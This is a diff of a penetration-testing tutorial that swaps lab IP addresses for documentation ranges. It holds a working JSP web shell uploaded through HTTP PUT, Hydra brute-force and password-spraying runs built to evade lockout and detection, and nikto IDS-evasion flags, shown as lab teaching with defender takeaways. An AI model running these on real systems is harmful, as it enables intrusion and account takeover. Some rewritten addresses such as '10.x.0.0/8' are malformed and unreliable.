@@ -1154,11 +1154,11 @@ msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; \
 
 **What this covers:** HTTP servers can be configured to accept methods beyond the standard GET and POST — OPTIONS reveals what methods the server allows, while PUT and DELETE can enable file upload and deletion if misconfigured. Dangerously permissive method configuration on web applications or REST APIs is a common misconfiguration that can lead to arbitrary file upload and remote code execution.
 
-**Scenario:** The web server on `10.10.10.5:80` and the Tomcat instance on `10.10.10.5:8080` both need HTTP method enumeration. Identify all accepted methods and test dangerous ones.
+**Scenario:** The web server on `192.0.2.5:80` and the Tomcat instance on `192.0.2.5:8080` both need HTTP method enumeration. Identify all accepted methods and test dangerous ones.
 
 ```bash
 # OPTIONS request — asks server to list its supported HTTP methods
-curl -X OPTIONS http://10.10.10.5/ -I -v 2>&1 | grep -i "allow\|methods"
+curl -X OPTIONS http://192.0.2.5/ -I -v 2>&1 | grep -i "allow\|methods"
 # -X OPTIONS    send HTTP OPTIONS request
 # -I            head-only (no body)
 # -v            verbose (show full request/response)
@@ -1167,11 +1167,11 @@ curl -X OPTIONS http://10.10.10.5/ -I -v 2>&1 | grep -i "allow\|methods"
 # => Accept-Ranges: bytes
 
 # Check Tomcat on port 8080
-curl -X OPTIONS http://10.10.10.5:8080/ -I -v 2>&1 | grep -i "allow"
+curl -X OPTIONS http://192.0.2.5:8080/ -I -v 2>&1 | grep -i "allow"
 # => Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS   # => PUT and DELETE enabled — critical!
 
 # Test PUT — attempt to upload a file
-curl -X PUT http://10.10.10.5:8080/test-upload.txt \
+curl -X PUT http://192.0.2.5:8080/test-upload.txt \
   -d "This is a test file" \
   -v 2>&1 | grep "< HTTP"
 # => < HTTP/1.1 201 Created     # => file uploaded successfully — critical finding!
@@ -1179,7 +1179,7 @@ curl -X PUT http://10.10.10.5:8080/test-upload.txt \
 # => Tomcat executes JSP — this is remote code execution
 
 # Upload a JSP web shell via HTTP PUT (lab demonstration only)
-curl -X PUT http://10.10.10.5:8080/shell.jsp \
+curl -X PUT http://192.0.2.5:8080/shell.jsp \
   -d '<%@ page import="java.io.*" %><%
     String cmd = request.getParameter("cmd");
     Process p = Runtime.getRuntime().exec(cmd);
@@ -1193,11 +1193,11 @@ curl -X PUT http://10.10.10.5:8080/shell.jsp \
 # => HTTP/1.1 201 Created   # => web shell uploaded
 
 # Test the uploaded shell
-curl "http://10.10.10.5:8080/shell.jsp?cmd=id"
+curl "http://192.0.2.5:8080/shell.jsp?cmd=id"
 # => uid=1000(tomcat) gid=1000(tomcat) groups=1000(tomcat)   # => code execution confirmed!
 
 # Test DELETE method
-curl -X DELETE http://10.10.10.5:8080/test-upload.txt -v 2>&1 | grep "< HTTP"
+curl -X DELETE http://192.0.2.5:8080/test-upload.txt -v 2>&1 | grep "< HTTP"
 # => < HTTP/1.1 204 No Content    # => file deleted — destructive capability confirmed
 ```
 
@@ -1211,10 +1211,10 @@ curl -X DELETE http://10.10.10.5:8080/test-upload.txt -v 2>&1 | grep "< HTTP"
 
 **What this covers:** Nikto is an open-source web server scanner that checks for thousands of known vulnerabilities, dangerous files, version disclosure, and configuration weaknesses in a single run. It produces a prioritized list of findings that complement directory brute-forcing and manual header analysis. Nikto is intentionally noisy — it is not designed for stealth — so use it when thoroughness outweighs detection risk.
 
-**Scenario:** Run nikto against the web server on `10.10.10.5:80` to get a comprehensive automated vulnerability assessment of the HTTP layer.
+**Scenario:** Run nikto against the web server on `192.0.2.5:80` to get a comprehensive automated vulnerability assessment of the HTTP layer.
 
 ```bash
-nikto -h http://10.10.10.5 -o /tmp/nikto-report.txt -Format txt
+nikto -h http://192.0.2.5 -o /tmp/nikto-report.txt -Format txt
 
 # -h          target host and URL
 # -o          output file
@@ -1232,7 +1232,7 @@ nikto -h http://10.10.10.5 -o /tmp/nikto-report.txt -Format txt
 # => Severity: HIGH — confirms PHP version
 
 # [HIGH] OSVDB-630: The web server may reveal its internal or real IP in the Location header.
-# => Server returned internal IP 10.0.0.5 in a redirect Location header
+# => Server returned internal IP 10.x.0.5 in a redirect Location header
 # => Reveals internal network topology — useful for pivot planning
 
 # [HIGH] OSVDB-3092: /backup/: This might be interesting...
@@ -1258,16 +1258,16 @@ nikto -h http://10.10.10.5 -o /tmp/nikto-report.txt -Format txt
 # => Version disclosure — already confirmed
 
 # Run against HTTPS with certificate verification disabled
-nikto -h https://10.10.10.5 -ssl -o /tmp/nikto-https.txt -Format txt
+nikto -h https://192.0.2.5 -ssl -o /tmp/nikto-https.txt -Format txt
 
 # Run with increased evasion techniques (evade basic IDS signatures)
-nikto -h http://10.10.10.5 -evasion 1,2,3
+nikto -h http://192.0.2.5 -evasion 1,2,3
 # -evasion 1  random URI encoding
 # -evasion 2  directory self-reference (/./)
 # -evasion 3  premature URL ending
 ```
 
-**Key Takeaway:** The internal IP disclosure in the Location header is a critical network reconnaissance finding — it reveals the actual internal IP scheme (`10.0.0.0/8`) behind a potential reverse proxy, enabling more accurate pivot planning. phpinfo() disclosure is a separate critical finding that must be reported regardless of other vulnerabilities. Defenders should remove phpinfo() pages, configure proper redirect behavior, and set all security headers.
+**Key Takeaway:** The internal IP disclosure in the Location header is a critical network reconnaissance finding — it reveals the actual internal IP scheme (`10.x.0.0/8`) behind a potential reverse proxy, enabling more accurate pivot planning. phpinfo() disclosure is a separate critical finding that must be reported regardless of other vulnerabilities. Defenders should remove phpinfo() pages, configure proper redirect behavior, and set all security headers.
 
 **Why It Matters:** Nikto serves as a rapid automated quality check that catches well-known issues that manual testing might miss due to time pressure. Its findings are tied to OSVDB identifiers that map directly to CVE numbers, making report writing straightforward. Red teamers use nikto output to populate the "automated scan findings" section of the report and to identify investigation priorities they may have missed in manual testing.
 
@@ -1277,7 +1277,7 @@ nikto -h http://10.10.10.5 -evasion 1,2,3
 
 **What this covers:** Searchsploit is a command-line interface to the Exploit-DB archive, the largest public repository of exploit code and proof-of-concept scripts. Given a service name and version, searchsploit returns all matching exploits with file paths to local copies. This bridges the gap between version detection and actual exploitation — from `nmap -sV` output to runnable exploit code in seconds.
 
-**Scenario:** Version detection revealed Apache 2.4.25, MySQL 5.7.28, Apache Tomcat 9.0.30, and OpenSSH 7.4p1 on `10.10.10.5`. Search ExploitDB for applicable exploits for each service.
+**Scenario:** Version detection revealed Apache 2.4.25, MySQL 5.7.28, Apache Tomcat 9.0.30, and OpenSSH 7.4p1 on `192.0.2.5`. Search ExploitDB for applicable exploits for each service.
 
 ```bash
 # Search for Apache 2.4.25 exploits
@@ -1326,7 +1326,7 @@ searchsploit -u
 # => [+] Done — /usr/share/exploitdb updated
 ```
 
-**Key Takeaway:** Ghostcat (CVE-2020-1938, CVSS 9.8) directly matches the Tomcat 9.0.30 version — the exploit script exists locally and is ready to run against the AJP port (8009). This single version-to-exploit mapping elevates `10.10.10.5` to "critical" priority in the engagement. Defenders must update Tomcat to 9.0.31+ or later and disable the AJP connector in `server.xml` if it is not needed for Apache-Tomcat proxying.
+**Key Takeaway:** Ghostcat (CVE-2020-1938, CVSS 9.8) directly matches the Tomcat 9.0.30 version — the exploit script exists locally and is ready to run against the AJP port (8009). This single version-to-exploit mapping elevates `192.0.2.5` to "critical" priority in the engagement. Defenders must update Tomcat to 9.0.31+ or later and disable the AJP connector in `server.xml` if it is not needed for Apache-Tomcat proxying.
 
 **Why It Matters:** Searchsploit closes the version-detection-to-exploitation loop with an offline database query — no internet connection needed during the engagement. Red teamers run searchsploit against every service version found during the nmap phase to build an exploit priority list before attempting any active exploitation. The offline nature is essential for air-gapped engagements and eliminates the risk of internet query logging.
 
@@ -1395,7 +1395,7 @@ grep "Critical.*Network" /tmp/cve-register.md
 
 **What this covers:** Metasploit Framework is the most widely used penetration testing platform, combining exploits, auxiliary modules, post-exploitation tools, and payload generation in a single framework. Auxiliary modules perform non-exploitation tasks — scanning, enumeration, brute-forcing, and fuzzing. Learning msfconsole navigation, module search, configuration, and execution is foundational for any red team engagement.
 
-**Scenario:** Use Metasploit's SSH version scanner auxiliary module to enumerate SSH versions across the `10.10.10.0/24` subnet, then explore the framework's module structure as a learning exercise.
+**Scenario:** Use Metasploit's SSH version scanner auxiliary module to enumerate SSH versions across the `192.0.2.0/24` subnet, then explore the framework's module structure as a learning exercise.
 
 ```bash
 # Launch Metasploit console
@@ -1436,8 +1436,8 @@ msf6 auxiliary(scanner/ssh/ssh_version) > show options
 # =>    THREADS  1                yes       The number of concurrent threads
 
 # Configure the target range
-msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 10.10.10.0/24
-# => RHOSTS => 10.10.10.0/24
+msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.0.2.0/24
+# => RHOSTS => 192.0.2.0/24
 
 msf6 auxiliary(scanner/ssh/ssh_version) > set THREADS 10
 # => THREADS => 10    # => 10 parallel scans — faster across /24
@@ -1445,10 +1445,10 @@ msf6 auxiliary(scanner/ssh/ssh_version) > set THREADS 10
 # Run the module
 msf6 auxiliary(scanner/ssh/ssh_version) > run
 
-# => [*] 10.10.10.1:22 - SSH server version: SSH-2.0-OpenSSH_7.9
-# => [+] 10.10.10.5:22 - SSH server version: SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7
+# => [*] 192.0.2.1:22 - SSH server version: SSH-2.0-OpenSSH_7.9
+# => [+] 192.0.2.5:22 - SSH server version: SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7
 # =>     (language: )     # => older version — CVE-2018-15473 applies
-# => [*] 10.10.10.10:22 - SSH server version: SSH-2.0-OpenSSH_8.9p1 Ubuntu
+# => [*] 192.0.2.10:22 - SSH server version: SSH-2.0-OpenSSH_8.9p1 Ubuntu
 # => [*] Scanned 256 of 256 hosts (100% complete)
 # => [*] Auxiliary module execution completed
 
@@ -1461,9 +1461,9 @@ msf6 > hosts
 # => =====
 # => address      mac  name  os_name  os_sp  purpose  info  comments
 # => -------      ---  ----  -------  -----  -------  ----  --------
-# => 10.10.10.1             Linux                     device
-# => 10.10.10.5             Linux    Debian           server
-# => 10.10.10.10            Linux    Ubuntu           server
+# => 192.0.2.1             Linux                     device
+# => 192.0.2.5             Linux    Debian           server
+# => 192.0.2.10            Linux    Ubuntu           server
 
 msf6 > exit
 ```
@@ -1478,51 +1478,51 @@ msf6 > exit
 
 **What this covers:** Hydra is a parallelized login cracker supporting SSH, FTP, HTTP, SMB, and dozens of other protocols. It automates credential testing at high speed against authentication services. In authorized penetration tests, brute-forcing is performed against targets with no account lockout policy — verified in Example 18's SMB enumeration showing lockout threshold of None.
 
-**Scenario:** You have a confirmed user list (`root`, `admin`, `john.smith`) from SMB enumeration and SSH username enumeration. The target `10.10.10.5` has no account lockout. Run Hydra against SSH using the rockyou wordlist against your authorized lab target.
+**Scenario:** You have a confirmed user list (`root`, `admin`, `john.smith`) from SMB enumeration and SSH username enumeration. The target `192.0.2.5` has no account lockout. Run Hydra against SSH using the rockyou wordlist against your authorized lab target.
 
 ```bash
 # Basic SSH brute-force — single username, rockyou wordlist
-hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.0.2.5
 
 # -l admin     single username (lowercase -l for single, uppercase -L for list)
 # -P           password file (uppercase -P for file, lowercase -p for single password)
 # ssh://       protocol and target
 
 # => [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries
-# => [DATA] attacking ssh://10.10.10.5:22/
-# => [22][ssh] host: 10.10.10.5   login: admin   password: admin123
+# => [DATA] attacking ssh://192.0.2.5:22/
+# => [22][ssh] host: 192.0.2.5   login: admin   password: admin123
 # =>           # => password found! "admin123" — trivially weak
 # => 1 of 1 target successfully completed, 1 valid password found
 
 # Multiple usernames — use username list file
 echo -e "root\nadmin\njohn.smith" > /tmp/users.txt
 hydra -L /tmp/users.txt -P /usr/share/wordlists/rockyou.txt \
-  -t 4 -s 22 ssh://10.10.10.5
+  -t 4 -s 22 ssh://192.0.2.5
 
 # -L /tmp/users.txt   user list file
 # -t 4                4 parallel tasks (reduce for SSH — too many triggers rate limiting)
 # -s 22               port number
 
-# => [22][ssh] host: 10.10.10.5  login: root        password: toor
+# => [22][ssh] host: 192.0.2.5  login: root        password: toor
 #              # => root with default "toor" password — direct root access!
-# => [22][ssh] host: 10.10.10.5  login: john.smith  password: password123
+# => [22][ssh] host: 192.0.2.5  login: john.smith  password: password123
 
 # FTP brute-force using same credentials (credential reuse is common)
-hydra -L /tmp/users.txt -P /usr/share/wordlists/rockyou.txt ftp://10.10.10.5
-# => [21][ftp] host: 10.10.10.5  login: admin  password: admin123
+hydra -L /tmp/users.txt -P /usr/share/wordlists/rockyou.txt ftp://192.0.2.5
+# => [21][ftp] host: 192.0.2.5  login: admin  password: admin123
 # => Same password reused on FTP — credential reuse confirmed
 
 # HTTP Basic auth brute-force against /admin/ discovered by gobuster
 hydra -L /tmp/users.txt -P /usr/share/wordlists/rockyou.txt \
-  http-get://10.10.10.5/admin/
+  http-get://192.0.2.5/admin/
 # http-get  HTTP GET with Basic authentication
-# => [80][http-get] host: 10.10.10.5  login: admin  password: admin123
+# => [80][http-get] host: 192.0.2.5  login: admin  password: admin123
 # => Web admin panel accessible with cracked credentials
 
 # Save successful credentials
-echo "10.10.10.5 SSH admin:admin123" >> /tmp/credentials.txt
-echo "10.10.10.5 SSH root:toor" >> /tmp/credentials.txt
-echo "10.10.10.5 FTP admin:admin123" >> /tmp/credentials.txt
+echo "192.0.2.5 SSH admin:admin123" >> /tmp/credentials.txt
+echo "192.0.2.5 SSH root:toor" >> /tmp/credentials.txt
+echo "192.0.2.5 FTP admin:admin123" >> /tmp/credentials.txt
 ```
 
 **Key Takeaway:** Root SSH access via the default password `toor` (root reversed) is an immediate full system compromise requiring zero exploitation skill — it is a credential failure, not a technical vulnerability. The credential reuse of `admin:admin123` across SSH, FTP, and HTTP demonstrates why password uniqueness per service is critical. Defenders must enforce password complexity, implement account lockout, and deploy fail2ban to automatically block brute-force sources.
@@ -1535,7 +1535,7 @@ echo "10.10.10.5 FTP admin:admin123" >> /tmp/credentials.txt
 
 **What this covers:** Password spraying tests one or a small set of common passwords against many usernames, rather than many passwords against one username. This technique bypasses account lockout policies — if lockout triggers after 5 failed attempts per account, spraying one password across 100 accounts generates only 1 attempt per account, staying under the threshold. Spraying is the primary credential attack strategy in environments with lockout enabled.
 
-**Scenario:** A different target domain, `192.168.1.0/24`, has SSH enabled on multiple hosts with account lockout set to 5 attempts. You have a user list of 50 accounts from OSINT. Demonstrate the spraying concept with a controlled, authorized test.
+**Scenario:** A different target domain, `198.51.100.0/24`, has SSH enabled on multiple hosts with account lockout set to 5 attempts. You have a user list of 50 accounts from OSINT. Demonstrate the spraying concept with a controlled, authorized test.
 
 ```bash
 # Understanding the math:
@@ -1563,19 +1563,19 @@ EOF
 
 # Step 3: Spray with a delay between rounds to avoid IDS detection
 # Manual spray using Hydra with throttling
-hydra -L /tmp/users.txt -p "Password1" -t 1 -w 5 ssh://192.168.1.10
+hydra -L /tmp/users.txt -p "Password1" -t 1 -w 5 ssh://198.51.100.10
 # -t 1   only 1 task (serial, not parallel) — reduces noise
 # -w 5   wait 5 seconds between attempts — evades time-based detection
 
-# => [22][ssh] host: 192.168.1.10  login: jane.doe  password: Password1
+# => [22][ssh] host: 198.51.100.10  login: jane.doe  password: Password1
 # => jane.doe uses "Password1" — spray successful on first attempt
 
 # Spray next password after a delay (simulate multiple rounds)
 sleep 300   # => wait 5 minutes between password rounds — mimics human pattern
-hydra -L /tmp/users.txt -p "Welcome1" -t 1 -w 5 ssh://192.168.1.10
+hydra -L /tmp/users.txt -p "Welcome1" -t 1 -w 5 ssh://198.51.100.10
 
 # Spray across multiple hosts simultaneously
-for host in 192.168.1.10 192.168.1.20 192.168.1.30; do
+for host in 198.51.100.10 198.51.100.20 198.51.100.30; do
   echo "Spraying $host..."
   hydra -L /tmp/users.txt -p "Password1" -t 1 ssh://"$host" 2>/dev/null
   # => Same password tested across all discovered SSH hosts
@@ -1605,16 +1605,16 @@ done
 ```bash
 # Create a target list of all discovered web URLs
 cat << 'EOF' > /tmp/web-targets.txt
-http://10.10.10.5
-https://10.10.10.5
-http://10.10.10.5:8080
-http://10.10.10.5/admin
-http://10.10.10.5/phpmyadmin
-http://10.10.10.10
-http://10.10.10.100
-http://192.168.1.10
-http://192.168.1.20
-http://192.168.1.30
+http://192.0.2.5
+https://192.0.2.5
+http://192.0.2.5:8080
+http://192.0.2.5/admin
+http://192.0.2.5/phpmyadmin
+http://192.0.2.10
+http://192.0.2.100
+http://198.51.100.10
+http://198.51.100.20
+http://198.51.100.30
 EOF
 
 # Run EyeWitness against the target list
@@ -1632,13 +1632,13 @@ eyewitness --web -f /tmp/web-targets.txt \
 # --no-prompt    skip interactive prompts (for automation)
 
 # --- EyeWitness output ---
-# [*] Attempting to screenshot http://10.10.10.5
-# [*] Attempting to screenshot https://10.10.10.5
-# [*] Attempting to screenshot http://10.10.10.5:8080
-# [+] http://10.10.10.5 - Apache 2.4.25 - screenshot saved    # => web server captured
-# [+] http://10.10.10.5:8080 - Apache Tomcat 9.0.30 default page  # => default page = low security
-# [+] http://10.10.10.5/admin - HTTP 401 Basic Auth prompt    # => admin panel confirmed visually
-# [+] http://10.10.10.5/phpmyadmin - phpMyAdmin login page    # => MySQL management UI visible
+# [*] Attempting to screenshot http://192.0.2.5
+# [*] Attempting to screenshot https://192.0.2.5
+# [*] Attempting to screenshot http://192.0.2.5:8080
+# [+] http://192.0.2.5 - Apache 2.4.25 - screenshot saved    # => web server captured
+# [+] http://192.0.2.5:8080 - Apache Tomcat 9.0.30 default page  # => default page = low security
+# [+] http://192.0.2.5/admin - HTTP 401 Basic Auth prompt    # => admin panel confirmed visually
+# [+] http://192.0.2.5/phpmyadmin - phpMyAdmin login page    # => MySQL management UI visible
 # [*] 10 URLs processed in 23.4 seconds
 # [*] Report written to /tmp/eyewitness-report/report.html
 
@@ -1650,7 +1650,7 @@ eyewitness --web -f /tmp/web-targets.txt \
 # - Normal pages (low — for completeness)
 
 # Integrate with nmap XML output for automated web discovery
-nmap -sV -p 80,443,8080,8443,8000,8888 10.10.10.0/24 \
+nmap -sV -p 80,443,8080,8443,8000,8888 192.0.2.0/24 \
   -oX /tmp/nmap-web.xml 2>/dev/null
 
 eyewitness --web --nmap /tmp/nmap-web.xml \
@@ -1664,10 +1664,10 @@ eyewitness --web --nmap /tmp/nmap-web.xml \
 
 # Extract URLs of all captured pages with HTTP 200 for follow-up investigation
 grep "200" /tmp/eyewitness-report/report.html | grep -o 'http[^"]*' | sort -u
-# => http://10.10.10.5
-# => http://10.10.10.5:8080
-# => http://10.10.10.5/phpmyadmin   # => phpMyAdmin — login with cracked MySQL root creds
-# => http://192.168.1.20            # => another live web service discovered via nmap
+# => http://192.0.2.5
+# => http://192.0.2.5:8080
+# => http://192.0.2.5/phpmyadmin   # => phpMyAdmin — login with cracked MySQL root creds
+# => http://198.51.100.20            # => another live web service discovered via nmap
 ```
 
 **Key Takeaway:** EyeWitness integrates directly with nmap XML output (`--nmap /tmp/nmap-web.xml`), transforming the entire web discovery and visual triage workflow into two commands — nmap to find web ports, EyeWitness to screenshot them all. The phpMyAdmin screenshot combined with the cracked MySQL root credentials from Example 26 completes the attack chain: credentials provide database access through a visual web interface. Defenders should restrict phpMyAdmin access by source IP or remove it from internet-accessible servers entirely.
